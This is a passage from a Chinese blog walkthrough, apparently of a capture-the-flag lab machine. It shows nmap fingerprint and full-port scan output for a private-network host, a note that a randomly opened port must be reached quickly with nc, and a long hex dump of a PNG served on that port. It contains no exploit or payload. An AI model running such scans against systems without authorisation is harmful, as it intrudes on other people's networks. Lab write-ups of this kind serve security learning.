escape_">\x</span>20ab2c<span class="char escape_">\x</span>2073c0<span class="char escape_">\x</span>209cb0<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span>E<span class="char escape_">\.</span><span class="char escape_">\.</span>q<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>-<span class="char escape_">\.</span>,s<span class="char escape_">\.</span><span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\n</span>00000070:<span class="char escape_">\x</span>200c08<span class="char escape_">\x</span>207292<span class="char escape_">\x</span>200491<span class="char escape_">\x</span>202092<span class="char escape_">\x</span>208380<span class="char escape_">\x</span>2008e2<span class="char escape_">\x</span>2009ca<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:0c1a1<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span>r<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000080:<span class="char escape_">\x</span>202248<span class="char escape_">\x</span>207a</span></span><br><span class="line"><span class="string">SF:ed<span class="char escape_">\x</span>20c799<span class="char escape_">\x</span>202ea7<span class="char escape_">\x</span>20a67a<span class="char escape_">\x</span>206f7b<span class="char escape_">\x</span>20c3ed<span class="char escape_">\x</span>20edf2<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\&quot;</span>Hz<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\.</span>zo&#123;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000090:<span class="char escape_">\x</span>207c3f<span class="char escape_">\x</span>205553<span class="char escape_">\x</span>201c7d<span class="char escape_">\x</span>20bdd3<span class="char escape_">\x</span>20d361<span class="char escape_">\x</span>209f</span></span><br><span class="line"><span class="string">SF:09<span class="char escape_">\x</span>20bbf7<span class="char escape_">\x</span>205400<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\|</span><span class="char escape_">\?</span>US<span class="char escape_">\.</span>&#125;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>a<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>T<span class="char escape_">\.</span><span class="char escape_">\n</span>000000a0:<span class="char escape_">\x</span>20802</span></span><br><span class="line"><span class="string">SF:1<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>!<span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000b0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>2080</span></span><br><span class="line"><span class="string">SF:25<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000c</span></span><br><span class="line"><span class="string">SF:0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20\</span></span><br><span class="line"><span class="string">SF:x20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000d0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c&quot;</span>);</span><br><span class="line">MAC <span class="params">Address:</span> F2:<span class="number">26</span>:D0:B6:<span class="number">19</span>:<span class="number">9</span>A (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.16</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.81</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">5.01</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>开了ssh和一个没见过的端口<br>但是我想在直接用-p-扫全部端口的时候发现开放的端口变了，所以这是一个随机开放的端口，扫除端口之后要快速用nc去访问内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap  -p- 192.168.112.81 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">22</span> <span class="number">18</span>:<span class="number">08</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.81</span>)</span><br><span class="line">Host is up (<span class="number">0.00054</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>    open  ssh</span><br><span class="line"><span class="number">50960</span><span class="symbol">/tcp</span> open  unknown</span><br><span class="line">MAC <span class="params">Address:</span> F2:<span class="number">26</span>:D0:B6:<span class="number">19</span>:<span class="number">9</span>A (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.45</span> seconds</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">nc</span> <span class="number">192.168</span><span class="number">.112</span><span class="number">.81</span> <span class="number">49146</span></span><br><span class="line"><span class="attr">00000000:</span> <span class="number">8950 </span><span class="number">4e47</span> <span class="string">0d0a</span> <span class="string">1a0a</span> <span class="number">0000 </span><span class="string">000d</span> <span class="number">4948 </span><span class="number">4452</span>  <span class="string">.PNG........IHDR</span></span><br><span class="line"><span class="attr">00000010:</span> <span class="number">0000 </span><span class="string">013f</span> <span class="number">0000 </span><span class="number">0085 </span><span class="number">0806 </span><span class="number">0000 </span><span class="string">002d</span> <span class="string">80ff</span>  <span class="string">...?.........-..</span></span><br><span class="line"><span class="attr">00000020:</span> <span class="string">0c00</span> <span class="number">0000 </span><span class="number">0173 </span><span class="number">5247 </span><span class="number">4200 </span><span class="string">aece</span> <span class="string">1ce9</span> <span class="number">0000</span>  <span class="string">.....sRGB.......</span></span><br><span class="line"><span class="attr">00000030:</span> <span class="number">0004 </span><span class="number">6741 </span><span class="string">4d41</span> <span class="number">0000 </span><span class="string">b18f</span> <span class="string">0bfc</span> <span class="number">6105 </span><span class="number">0000</span>  <span class="string">..gAMA......a...</span></span><br><span class="line"><span class="attr">00000040:</span> <span class="number">0009 </span><span class="number">7048 </span><span class="number">5973 </span><span class="number">0000 </span><span class="string">0ec3</span> <span class="number">0000 </span><span class="string">0ec3</span> <span class="string">01c7</span>  <span class="string">..pHYs..........</span></span><br><span class="line"><span class="attr">00000050:</span> <span class="string">6fa8</span> <span class="number">6400 </span><span class="number">0007 </span><span class="string">de49</span> <span class="number">4441 </span><span class="number">5478 </span><span class="string">5eed</span> <span class="string">dbf7</span>  <span class="string">o.d....IDATx^...</span></span><br><span class="line"><span class="attr">00000060:</span> <span class="number">9314 </span><span class="number">4518 </span><span class="string">c671</span> <span class="string">ffff</span> <span class="string">1f2d</span> <span class="string">ab2c</span> <span class="string">73c0</span> <span class="string">9cb0</span>  <span class="string">..E..q...-.,s...</span></span><br><span class="line"><span class="attr">00000070:</span> <span class="string">0c08</span> <span class="number">7292 </span><span class="number">0491 </span><span class="number">2092 </span><span class="number">8380 </span><span class="number">08e2</span> <span class="string">09ca</span> <span class="string">c1a1</span>  <span class="string">..r...</span> <span class="string">.........</span></span><br><span class="line"><span class="attr">00000080:</span> <span class="number">2248 </span><span class="string">7aed</span> <span class="string">c799</span> <span class="string">2ea7</span> <span class="string">a67a</span> <span class="string">6f7b</span> <span class="string">c3ed</span> <span class="string">edf2</span>  <span class="string">&quot;Hz......zo&#123;....</span></span><br><span class="line"><span class="string">00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400  |?US.&#125;...a....T.</span></span><br><span class="line"><span class="string">000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f  .!...%...%...%..</span></span><br><span class="line"><span class="string">000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000d0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000e0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">000000f0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000100: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000110: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000120: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000130: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000140: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000150: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000160: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000170: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..</span></span><br><span class="line"><span class="string">00000180: 8025 c20f 8025 c20f 80a5 c50c bf07 0f23  .%...%.........#</span></span><br><span class="line"><span class="string">00000190: eede 8fb8 d76e fa59 654f 82dc b7bf ff69  .....n.YeO.....i</span></span><br><span class="line"><span class="string">000001a0: 0b30 538f 1fa7 f14f 63af 4d3f 976c d41c  .0S....Oc.M?.l..</span></span><br><span class="line"><span class="string">000001b0: cda2 5da3 f5b7 98e1 77e4 c788 67b7 45bc  ..].....w...g.E.</span></span><br><span class="line"><span class="string">000001c0: f855 c49b 5f47 bcba 33e2 f8e5 f697 0b4e  .U.._G..3......N</span></span><br><span class="line"><span class="string">000001d0: fd50 7f5e 586a 0b30 5337 ff8a 7869 47b3  .P.^Xj.0S7..xiG.</span></span><br><span class="line"><span class="string">000001e0: e9e7 928d 9aa3 59b4 6bb4 fe16 ffb6 f78d  ......Y.k.......</span></span><br><span class="line"><span class="string">000001f0: 3d11 efec 8b38 73b5 2d58 703f 2c47 bcbd  =....8s.-Xp?,G..</span></span><br><span class="line"><span class="string">00000200: 37bd f952 b063 f6ee dc8b 782b 9d50 b5e9  7..R.c....x+.P..</span></span><br><span class="line"><span class="string">00000210: e712 ad35 adb9 4d69 edcd d22c dad5 fadb  ...5..Mi...,....</span></span><br><span class="line"><span class="string">00000220: 88be 6d80 c50f 3f4d d25a e1a7 4bf8 5da7  ..m...?M.Z..K.].</span></span><br><span class="line"><span class="string">00000230: 2276 9ffe 7f3b d6bb 4abc f27b c49e 54be  &quot;</span><span class="string">v...;..J..&#123;..T.</span></span><br><span class="line"><span class="attr">00000240:</span> <span class="string">e364</span> <span class="string">5b90</span> <span class="string">94ca</span> <span class="string">64dc</span> <span class="string">fd5d</span> <span class="string">5d29</span> <span class="string">efaf</span> <span class="string">4b67</span>  <span class="string">.d[...d..]])..Kg</span></span><br><span class="line"><span class="attr">00000250:</span> <span class="string">dd2d</span> <span class="number">4722 </span><span class="string">bef8</span> <span class="string">3ee2</span> <span class="string">da6a</span> <span class="string">5b98</span> <span class="string">cce2</span> <span class="string">f826</span>  <span class="string">.-G&quot;..&gt;..j[....&amp;</span></span><br><span class="line"><span class="attr">00000260:</span> <span class="string">d99f</span> <span class="string">fc79</span> <span class="number">3762 </span><span class="string">e9f8</span> <span class="string">daf5</span> <span class="string">721b</span> <span class="string">fbce</span> <span class="string">ae5d</span>  <span class="string">...y7b....r....]</span></span><br><span class="line"><span class="attr">00000270:</span> <span class="string">4f4a</span> <span class="string">ed6a</span> <span class="string">fbf2</span> <span class="string">585b</span> <span class="string">a155</span> <span class="string">7b7c</span> <span class="string">35f5</span> <span class="string">2ea7</span>  <span class="string">OJ.j..X[.U&#123;|5...</span></span><br><span class="line"><span class="attr">00000280:</span> <span class="string">e3d3</span> <span class="string">fedf</span> <span class="string">dfdf</span> <span class="string">6c1a</span> <span class="string">0b1d</span> <span class="string">afea</span> <span class="string">76db</span> <span class="string">cd21</span>  <span class="string">......l.....v..!</span></span><br><span class="line"><span class="attr">00000290:</span> <span class="string">f4de</span> <span class="number">3711 </span><span class="string">7b3b</span> <span class="string">7d19</span> <span class="string">b75d</span> <span class="string">a9e9</span> <span class="string">ef28</span> <span class="string">edd6</span>  <span class="string">..7.&#123;;&#125;..]...(..</span></span><br><span class="line"><span class="attr">000002a0:</span> <span class="string">cc87</span> <span class="string">74db</span> <span class="string">fdfa</span> <span class="string">4cb3</span> <span class="string">f63e</span> <span class="string">487d</span> <span class="string">ef87</span> <span class="string">5f4d</span>  <span class="string">..t...L..&gt;H&#125;.._M</span></span><br><span class="line"><span class="attr">000002b0:</span> <span class="string">3f06</span> <span class="string">ada1</span> <span class="string">bfd2</span> <span class="number">4944 </span><span class="string">afd5</span> <span class="string">a69f</span> <span class="string">e7c4</span> <span class="string">931d</span>  <span class="string">?.....ID........</span></span><br><span class="line"><span class="attr">000002c0:</span> <span class="string">7eab</span> <span class="string">779a</span> <span class="number">4079 </span><span class="string">6d57</span> <span class="string">73ab</span> <span class="string">7cf8</span> <span class="string">62c4</span> <span class="string">b6a3</span>  <span class="string">~.w.@ymWs.|.b...</span></span><br><span class="line"><span class="attr">000002d0:</span> <span class="string">119f</span> <span class="string">1c8e</span> <span class="string">b874</span> <span class="string">bdad</span> <span class="string">949c</span> <span class="string">baf2</span> <span class="string">ffed</span> <span class="number">7356</span>  <span class="string">.....t........sV</span></span><br><span class="line"><span class="attr">000002e0:</span> <span class="string">2a1b</span> <span class="string">777f</span> <span class="string">cbb7</span> <span class="string">9a45</span> <span class="string">a1b2</span> <span class="string">97d3</span> <span class="string">edd4</span> <span class="string">205f</span>  <span class="string">*.w....E......</span> <span class="string">_</span></span><br><span class="line"><span class="attr">000002f0:</span> <span class="string">a6c5</span> <span class="string">aa2b</span> <span class="string">8ea5</span> <span class="string">136d</span> <span class="string">416b</span> <span class="string">bd8f</span> <span class="string">4f6a</span> <span class="string">f7b7</span>  <span class="string">...+...mAk..Oj..</span></span><br><span class="line"><span class="attr">00000300:</span> <span class="string">35bd</span> <span class="string">393e</span> <span class="number">3e14</span> <span class="string">71f1</span> <span class="string">5a5b</span> <span class="string">a9a5</span> <span class="string">aba4</span> <span class="string">6fce</span>  <span class="number">5.9</span><span class="string">&gt;&gt;.q.Z[....o.</span></span><br><span class="line"><span class="attr">00000310:</span> <span class="string">451c</span> <span class="string">bc30</span> <span class="string">bc5d</span> <span class="string">f571</span> <span class="string">ade3</span> <span class="string">ebb7</span> <span class="string">ab7d</span> <span class="string">e64d</span>  <span class="string">E..0.].q.....&#125;.M</span></span><br><span class="line"><span class="attr">00000320:</span> <span class="string">6ffa</span> <span class="string">acb6</span> <span class="string">bfb5</span> <span class="string">f596</span> <span class="string">6f36</span> <span class="string">f3a4</span> <span class="string">70d1</span> <span class="string">a690</span>  <span class="string">o.......o6..p...</span></span><br><span class="line"><span class="attr">00000330:</span> <span class="number">3e54</span> <span class="number">6837 </span><span class="string">87d0</span> <span class="string">bba9</span> <span class="string">ce34</span> <span class="string">daad</span> <span class="string">ed6f</span> <span class="string">6dbb</span>  <span class="string">&gt;Th7.....4...om.</span></span><br><span class="line"><span class="attr">00000340:</span> <span class="number">5233 </span><span class="string">1fa5</span> <span class="string">e353</span> <span class="string">602a</span> <span class="string">f8bb</span> <span class="string">e157</span> <span class="string">db8f</span> <span class="string">fe1a</span>  <span class="string">R3...S`*...W....</span></span><br><span class="line"><span class="attr">00000350:</span> <span class="string">ba72</span> <span class="string">a379</span> <span class="string">eded</span> <span class="string">bf23</span> <span class="string">5edf</span> <span class="string">dd6c</span> <span class="string">b706</span> <span class="string">3c4a</span>  <span class="string">.r.y...#^..l..&lt;J</span></span><br><span class="line"><span class="attr">00000360:</span> <span class="string">d800</span> <span class="string">4f76</span> <span class="string">f89d</span> <span class="string">4c93</span> <span class="string">a1db</span> <span class="string">e2ee</span> <span class="string">44fe</span> <span class="string">f04b</span>  <span class="string">..Ov..L.....D..K</span></span><br><span class="line"><span class="attr">00000370:</span> <span class="string">7b5b</span> <span class="string">d909</span> <span class="string">a1bc</span> <span class="string">a8ba</span> <span class="string">f54a</span> <span class="string">65a3</span> <span class="string">ee4f</span> <span class="string">0b41</span>  &#123;[<span class="string">.......Je..O.A</span></span><br><span class="line"><span class="attr">00000380:</span> <span class="string">be4a</span> <span class="string">67c2</span> <span class="string">8f0f</span> <span class="string">467c</span> <span class="string">f65d</span> <span class="number">7356 </span><span class="string">2d79</span> <span class="string">f828</span>  <span class="string">.Jg...F|.</span>]<span class="string">sV-y.(</span></span><br><span class="line"><span class="attr">00000390:</span> <span class="string">627b</span> <span class="string">5a78</span> <span class="string">1f7e</span> <span class="string">9bce</span> <span class="string">c09d</span> <span class="string">052f</span> <span class="string">eb75</span> <span class="string">7ce3</span>  <span class="string">b</span>&#123;<span class="string">Zx.~...../.u|.</span></span><br><span class="line"><span class="attr">000003a0:</span> <span class="string">ec4f</span> <span class="string">a1b7</span> <span class="string">f940</span> <span class="number">1360 </span><span class="string">6ba9</span> <span class="string">6db7</span> <span class="string">54af</span> <span class="string">d46e</span>  <span class="string">.O...@.`k.m.T..n</span></span><br><span class="line"><span class="attr">000003b0:</span> <span class="string">496d</span> <span class="string">7f6b</span> <span class="string">eb89</span> <span class="string">ae4c</span> <span class="string">f26d</span> <span class="string">efa0</span> <span class="string">ab94</span> <span class="string">49fa</span>  <span class="string">Im.k...L.m....I.</span></span><br><span class="line"><span class="attr">000003c0:</span> <span class="number">3149 </span><span class="string">7f6b</span> <span class="string">db2d</span> <span class="number">19e5</span> <span class="string">f86a</span> <span class="string">d641</span> <span class="string">697f</span> <span class="string">fde3</span>  <span class="string">1I.k.-...j.Ai...</span></span><br><span class="line"><span class="attr">000003d0:</span> <span class="string">fb34</span> <span class="string">adf7</span> <span class="number">9329 </span><span class="string">34bb</span> <span class="string">8f12</span> <span class="number">1486 </span><span class="number">73e2</span> <span class="string">c90e</span>  <span class="number">.4</span><span class="string">...)4.....s...</span></span><br><span class="line"><span class="attr">000003e0:</span> <span class="string">bfd2</span> <span class="number">6299 </span><span class="string">76d9</span> <span class="string">f95f</span> <span class="string">07d7</span> <span class="string">fbe8</span> <span class="string">40c4</span> <span class="string">335b</span>  <span class="string">..b.v.._....@.3</span>[</span><br><span class="line"><span class="attr">000003f0:</span> <span class="string">23fe</span> <span class="number">4867 </span><span class="string">be61</span> <span class="string">f480</span> <span class="string">f9ad</span> <span class="string">b498</span> <span class="string">ce2f</span> <span class="string">b705</span>  <span class="comment">#.Hg.a......./..</span></span><br><span class="line"><span class="attr">00000400:</span> <span class="string">1dd3</span> <span class="string">3ee6</span> <span class="string">49ca</span> <span class="string">6aad</span> <span class="string">352e</span> <span class="string">c3ca</span> <span class="string">8eff</span> <span class="string">d45c</span>  <span class="string">..&gt;.I.j.5......\</span></span><br><span class="line"><span class="attr">00000410:</span> <span class="string">650c</span> <span class="string">6bb7</span> <span class="string">f4da</span> <span class="string">da76</span> <span class="string">4bf5</span> <span class="string">446f</span> <span class="string">ce61</span> <span class="string">6fd4</span>  <span class="string">e.k....vK.Do.ao.</span></span><br><span class="line"><span class="attr">00000420:</span> <span class="string">da7e</span> <span class="string">d4b6</span> <span class="string">3b49</span> <span class="string">7f4b</span> <span class="number">6525 </span><span class="string">93cc</span> <span class="string">c7b8</span> <span class="string">655f</span>  <span class="string">.~..;I.Ke%....e_</span></span><br><span class="line"><span class="attr">00000430:</span> <span class="string">a4ab</span> <span class="string">c333</span> <span class="string">3f13</span> <span class="string">7eeb</span> <span class="number">4603 </span><span class="string">ad01</span> <span class="string">d7c0</span> <span class="string">f74d</span>  <span class="string">...3?.~.F......M</span></span><br><span class="line"><span class="attr">00000440:</span> <span class="number">7322 </span><span class="number">2597 </span><span class="string">e9ea</span> <span class="string">4c13</span> <span class="string">996f</span> <span class="string">e114</span> <span class="string">5add</span> <span class="string">0f28</span>  <span class="string">s&quot;%...L..o..Z..(</span></span><br><span class="line"><span class="attr">00000450:</span> <span class="string">723d</span> <span class="string">9d2d</span> <span class="string">6ba9</span> <span class="string">1d6d</span> <span class="string">27d2</span> <span class="string">99b2</span> <span class="string">6f1a</span> <span class="string">c73c</span>  <span class="string">r=.-k..m&#x27;...o..&lt;</span></span><br><span class="line"><span class="attr">00000460:</span> <span class="string">adb2</span> <span class="number">4174 </span><span class="string">95a4</span> <span class="string">f1c8</span> <span class="string">9b6e</span> <span class="string">cd34</span> <span class="string">4ee3</span> <span class="string">b6a1</span>  <span class="string">..At.....n.4N...</span></span><br><span class="line"><span class="attr">00000470:</span> <span class="string">4f5a</span> <span class="string">5f49</span> <span class="string">b74f</span> <span class="string">dd71</span> <span class="string">d615</span> <span class="number">7457 </span><span class="string">7e6d</span> <span class="string">ed7c</span>  <span class="string">OZ_I.O.q..tW~m.|</span></span><br><span class="line"><span class="attr">00000480:</span> <span class="string">0cab</span> <span class="string">27eb</span> <span class="string">117e</span> <span class="string">35ed</span> <span class="string">8ed2</span> <span class="string">df9a</span> <span class="string">f19b</span> <span class="string">e67c</span>  <span class="string">..&#x27;..~5........|</span></span><br><span class="line"><span class="attr">00000490:</span> <span class="string">8c5b</span> <span class="string">46f8</span> <span class="string">ad33</span> <span class="string">0db4</span> <span class="string">065c</span> <span class="string">03df</span> <span class="string">573b</span> <span class="string">69f9</span>  <span class="string">.</span>[<span class="string">F..3...\..W;i.</span></span><br><span class="line"><span class="attr">000004a0:</span> <span class="number">5945 </span><span class="string">b7ec</span> <span class="string">5c7b</span> <span class="string">59af</span> <span class="number">0599 </span><span class="string">e5d7</span> <span class="string">aa7c</span> <span class="string">e5cf</span>  <span class="string">YE..\</span>&#123;<span class="string">Y......|..</span></span><br><span class="line"><span class="attr">000004b0:</span> <span class="string">e619</span> <span class="string">d1af</span> <span class="string">b79a</span> <span class="string">edea</span> <span class="string">4a5b</span> <span class="number">2929 </span><span class="string">b531</span> <span class="number">8816</span>  <span class="string">........J</span>[<span class="string">)).1..</span></span><br><span class="line"><span class="attr">000004c0:</span> <span class="string">a91e</span> <span class="string">34ab</span> <span class="string">7d9d</span> <span class="string">9db5</span> <span class="string">50fa</span> <span class="string">6afb</span> <span class="string">318b</span> <span class="string">b292</span>  <span class="string">..4.</span>&#125;<span class="string">...P.j.1...</span></span><br><span class="line"><span class="attr">000004d0:</span> <span class="string">9f6f</span> <span class="string">a437</span> <span class="string">ea89</span> <span class="string">a69e</span> <span class="string">c6e5</span> <span class="string">b7db</span> <span class="number">1107 </span><span class="string">cf37</span>  <span class="string">.o.7...........7</span></span><br><span class="line"><span class="attr">000004e0:</span> <span class="string">cfcd</span> <span class="string">c66d</span> <span class="string">43df</span> <span class="string">37d3</span> <span class="string">986a</span> <span class="string">8cb5</span> <span class="string">bf03</span> <span class="string">697f</span>  <span class="string">...mC.7..j....i.</span></span><br><span class="line"><span class="attr">000004f0:</span> <span class="string">ba92</span> <span class="string">de7d</span> <span class="string">aaad</span> <span class="number">90e4</span> <span class="string">d7d6</span> <span class="string">cec7</span> <span class="string">b07a</span> <span class="string">b21e</span>  <span class="string">...</span>&#125;<span class="string">.........z..</span></span><br><span class="line"><span class="attr">00000500:</span> <span class="string">e157</span> <span class="string">d3ee</span> <span class="string">28fd</span> <span class="string">1dd6</span> <span class="string">eeb4</span> <span class="string">e7a3</span> <span class="string">b6ac</span> <span class="string">ff3e</span>  <span class="string">.W..(..........&gt;</span></span><br><span class="line"><span class="attr">00000510:</span> <span class="string">fafc</span> <span class="string">48aa</span> <span class="string">97c2</span> <span class="string">efde</span> <span class="number">8366 </span><span class="string">3c79</span> <span class="string">e637</span> <span class="string">651a</span>  <span class="string">..H......f&lt;y.7e.</span></span><br><span class="line"><span class="attr">00000520:</span> <span class="string">684d</span> <span class="number">8226 </span><span class="string">a3ef</span> <span class="string">741a</span> <span class="string">782d</span> <span class="string">bcd2</span> <span class="string">a469</span> <span class="string">22b2</span>  <span class="string">hM.&amp;..t.x-...i&quot;.</span></span><br><span class="line"><span class="attr">00000530:</span> <span class="string">6b69</span> <span class="string">31ea</span> <span class="string">e1f6</span> <span class="string">a654</span> <span class="string">a605</span> <span class="string">a84f</span> <span class="string">fdf6</span> <span class="string">a640</span>  <span class="string">ki1....T...O...@</span></span><br><span class="line"><span class="attr">00000540:</span> <span class="string">da7c</span> <span class="string">b079</span> <span class="string">e09d</span> <span class="string">95f6</span> <span class="number">5752 </span><span class="string">5a18</span> <span class="number">83e8</span> <span class="string">0da6</span>  <span class="string">.|.y....WRZ.....</span></span><br><span class="line"><span class="attr">00000550:</span> <span class="number">7675 </span><span class="number">9538 </span><span class="string">e8f6</span> <span class="string">b8b6</span> <span class="string">1fd3</span> <span class="string">a8d7</span> <span class="string">2d2b</span> <span class="string">d5d3</span>  <span class="string">vu.8........-+..</span></span><br><span class="line"><span class="attr">00000560:</span> <span class="string">e2bd</span> <span class="number">9042 </span><span class="string">fa6c</span> <span class="string">3a39</span> <span class="string">647a</span> <span class="number">2654 </span><span class="string">3a79</span> <span class="string">f4f7</span>  <span class="string">...B.l:9dz&amp;T:y..</span></span><br><span class="line"><span class="attr">00000570:</span> <span class="string">576a</span> <span class="string">a376</span> <span class="string">acf2</span> <span class="string">c9a8</span> <span class="string">fb81</span> <span class="string">51ed</span> <span class="string">7cd4</span> <span class="string">d693</span>  <span class="string">Wj.v......Q.|...</span></span><br><span class="line"><span class="attr">00000580:</span> <span class="string">5b69</span> <span class="number">3e34</span> <span class="string">177a</span> <span class="string">b3ea</span> <span class="string">417d</span> <span class="string">496d</span> <span 